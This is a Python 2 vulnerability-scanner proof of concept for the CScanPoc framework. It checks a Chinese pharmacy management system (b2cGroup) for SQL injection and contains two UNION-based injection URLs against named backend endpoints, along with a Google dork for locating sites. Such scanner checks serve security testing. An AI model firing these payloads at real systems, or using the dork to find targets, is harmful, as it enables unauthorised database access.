# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time

class Vuln(ABVuln):
    vuln_id = 'b2cGroup_0001' # 平台漏洞编号，留空
    name = '珍诚药店管理系统后台 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-10'  # 漏洞公布时间
    desc = '''  
        珍诚药店管理系统后台两处SQL注入漏洞。
        google dork: powered by b2cGroup

        getProductQualification.do?productCode=1000100887
        managerProductDetail.do?productid=9950004
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '珍诚药店管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '8d1b7940-010d-4eb3-9a62-7263130c89c3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer: http://www.wooyun.org/bugs/wooyun-2015-0124399
            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = [
                    arg + '/getProductQualification.do?productCode=1000100887%27%20union%20all%20select%20NULL,%20NULL,%20NULL,%20NULL,%20CHR(58)||CHR(112)||CHR(119)||CHR(116)||CHR(102),NULL%20FROM%20DUAL--',
                    arg + '/managerProductDetail.do?productid=9950004)%20union%20all%20select%20CHR(58)||CHR(112)||CHR(119)||CHR(116)||CHR(102),NULL%20FROM%20DUAL--',
            ]
            for payload in payloads:
                code, head, res, err, _ = hh.http(payload)
                if(code == 200) and (':pwtf' in res):
                    #security_hole("SQL injection: " + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
